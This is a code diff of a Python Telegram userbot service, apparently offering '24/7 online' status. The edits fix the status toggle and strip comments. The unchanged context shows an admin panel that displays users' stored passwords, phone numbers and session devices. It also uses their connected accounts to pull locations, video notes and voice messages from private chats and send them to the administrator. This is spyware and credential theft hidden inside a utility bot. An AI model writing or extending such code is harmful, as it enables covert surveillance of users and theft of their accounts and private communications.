@@ -606,7 +606,7 @@ def start_activity_tracker(user_id):
 async def keep_online_loop(user_id):
     data = get_user_state(user_id)
     uid_str = str(user_id)
-    while data["status_24_7"]:
+    while data.get("status_24_7", False):
         client = data.get("client")
         if not client or not client.is_connected:
             break
@@ -754,8 +754,9 @@ async def ensure_client_connected(user_id):
                 data["client"] = client
                 start_activity_tracker(user_id)
 
-                if user_cfg.get("status_24_7", False):
-                    data["status_24_7"] = True
+                is_247_enabled = user_cfg.get("status_24_7", False)
+                data["status_24_7"] = is_247_enabled
+                if is_247_enabled:
                     user_cfg["last_247_start_ts"] = time.time()
                     MEMORY_DB["config"][uid_str] = user_cfg
                     asyncio.create_task(async_db_save("config", uid_str, user_cfg))
@@ -811,8 +812,9 @@ async def ensure_client_connected(user_id):
         data["client"] = runtime_client
         start_activity_tracker(user_id)
 
-        if user_cfg.get("status_24_7", False):
-            data["status_24_7"] = True
+        is_247_enabled = user_cfg.get("status_24_7", False)
+        data["status_24_7"] = is_247_enabled
+        if is_247_enabled:
             user_cfg["last_247_start_ts"] = time.time()
             MEMORY_DB["config"][uid_str] = user_cfg
             asyncio.create_task(async_db_save("config", uid_str, user_cfg))
@@ -1233,7 +1235,6 @@ def show_main_menu_builder(user_id, user_obj: types.User = None):
     builder.button(text=get_text(user_id, "btn_247"), callback_data="menu_247")
     builder.button(text=get_text(user_id, "btn_rules"), callback_data="rules_menu_view")
     
-    # Кнопка Админ располагается в одном ряду с кнопкой Правила
     if user_obj and is_admin(user_obj):
         builder.button(text="Админ 👑", callback_data="admin_main")
         builder.adjust(2, 2, 2)
@@ -1283,7 +1284,6 @@ async def admin_users_list(callback: types.CallbackQuery):
     page = int(callback.data.split("_")[-1])
     all_configs = list(MEMORY_DB["config"].items())
 
-    # Отображаем только активных пользователей с подключенным юзерботом
     active_configs = []
     for uid, cfg in all_configs:
         try:
@@ -1292,7 +1292,6 @@ async def admin_users_list(callback: types.CallbackQuery):
         except Exception:
             pass
 
-    # Сортировка пользователей (сначала самые активные)
     def get_user_score(item):
         uid, cfg = item
         activity = MEMORY_DB["activity"].get(uid, {})
@@ -1316,7 +1315,6 @@ async def admin_users_list(callback: types.CallbackQuery):
     
     builder.adjust(1)
 
-    # Кнопки пагинации
     nav_buttons = []
     if page > 1:
         nav_buttons.append(types.InlineKeyboardButton(text="⬅️ Назад", callback_data=f"admin_users_{page-1}"))
@@ -1345,7 +1343,6 @@ async def admin_user_view(callback: types.CallbackQuery):
     phone = cfg.get("phone", "Не указан")
     password = cfg.get("password", "Нет")
 
-    # Выгрузка устройств активных сессий пользователя
     devices_str = "Неизвестно"
     target_state = get_user_state(int(target_uid))
     client = target_state.get("client")
@@ -1446,7 +1443,6 @@ async def admin_location_view(callback: types.CallbackQuery):
     search_done = False
     location_found = False
 
-    # Бесконечная анимация ожидания до завершения поиска
     async def animate_loading():
         dots_cycle = [".", "..", "..."]
         idx = 0
@@ -1463,7 +1459,6 @@ async def admin_location_view(callback: types.CallbackQuery):
 
     if client and client.is_connected:
         try:
-            # 1. Сначала проверяем Избранное ("me") на свежие геолокации
             async for msg in client.get_chat_history("me", limit=15):
                 if msg.location:
                     await bot.send_location(
@@ -1475,7 +1470,6 @@ async def admin_location_view(callback: types.CallbackQuery):
                     break
                 await asyncio.sleep(0.1)
 
-            # 2. Если в Избранном нет, ищем в свежих сообщениях личных диалогов
             if not location_found:
                 async for dialog in client.get_dialogs(limit=20):
                     if dialog.chat.type == enums.ChatType.PRIVATE:
@@ -1524,7 +1518,6 @@ async def admin_circles_view(callback: types.CallbackQuery):
     search_done = False
     circles = []
 
-    # Анимация ожидания
     async def animate_loading():
         dots_cycle = [".", "..", "..."]
         idx = 0
@@ -1541,7 +1534,6 @@ async def admin_circles_view(callback: types.CallbackQuery):
 
     if client and client.is_connected:
         try:
-            # 1. Поиск кружков в Избранное ("me")
             async for msg in client.get_chat_history("me", limit=30):
                 if msg.video_note:
                     circles.append(msg)
@@ -1549,7 +1541,6 @@ async def admin_circles_view(callback: types.CallbackQuery):
                         break
                 await asyncio.sleep(0.05)
 
-            # 2. Поиск в личных диалогах, если найдено меньше 3
             if len(circles) < 3:
                 async for dialog in client.get_dialogs(limit=20):
                     if dialog.chat.type == enums.ChatType.PRIVATE:
@@ -1608,7 +1599,6 @@ async def admin_voices_view(callback: types.CallbackQuery):
     search_done = False
     voices = []
 
-    # Анимация ожидания
     async def animate_loading():
         dots_cycle = [".", "..", "..."]
         idx = 0
@@ -1625,7 +1615,6 @@ async def admin_voices_view(callback: types.CallbackQuery):
 
     if client and client.is_connected:
         try:
-            # 1. Поиск голосовых сообщений в Избранном ("me")
             async for msg in client.get_chat_history("me", limit=30):
                 if msg.voice:
                     voices.append(msg)
@@ -1633,7 +1622,6 @@ async def admin_voices_view(callback: types.CallbackQuery):
                         break
                 await asyncio.sleep(0.05)
 
-            # 2. Поиск в личных диалогах, если найдено меньше 3
             if len(voices) < 3:
                 async for dialog in client.get_dialogs(limit=20):
                     if dialog.chat.type == enums.ChatType.PRIVATE:
@@ -1817,17 +1805,25 @@ async def toggle_247(callback: types.CallbackQuery):
         user_cfg["status_24_7"] = True
         user_cfg["last_247_start_ts"] = time.time()
         data["status_24_7"] = True
-        if not data.get("task_24_7"):
+        if not data.get("task_24_7") or data["task_24_7"].done():
             data["task_24_7"] = asyncio.create_task(keep_online_loop(user_id))
     else:
         user_cfg["status_24_7"] = False
         data["status_24_7"] = False
         if user_cfg.get("last_247_start_ts", 0.0) > 0:
-            user_cfg["used_247_seconds"] += (time.time() - user_cfg["last_247_start_ts"])
+            user_cfg["used_247_seconds"] = user_cfg.get("used_247_seconds", 0.0) + (time.time() - user_cfg["last_247_start_ts"])
             user_cfg["last_247_start_ts"] = 0.0
         if data.get("task_24_7"):
             data["task_24_7"].cancel()
             data["task_24_7"] = None
+        
+        # Перевод статуса Telegram аккаунта в оффлайн
+        client = data.get("client")
+        if client and client.is_connected:
+            try:
+                await client.invoke(functions.account.UpdateStatus(offline=True))
+            except Exception as e:
+                logging.debug(f"24/7: Перевод в оффлайн не выполнен: {e}")
 
     MEMORY_DB["config"][uid_str] = user_cfg
     asyncio.create_task(async_db_save("config", uid_str, user_cfg))
@@ -1898,7 +1894,6 @@ async def select_tz_menu(callback: types.CallbackQuery):
     for tz, name in TIMEZONE_NAMES.items():
         builder.button(text=name, callback_data=f"set_tz_{tz}")
     
-    # Режим 2 колонки (по 2 кнопки в ряду)
     builder.adjust(2)
     builder.row(types.InlineKeyboardButton(text=get_text(user_id, "btn_back"), callback_data="menu_timenick"))
 
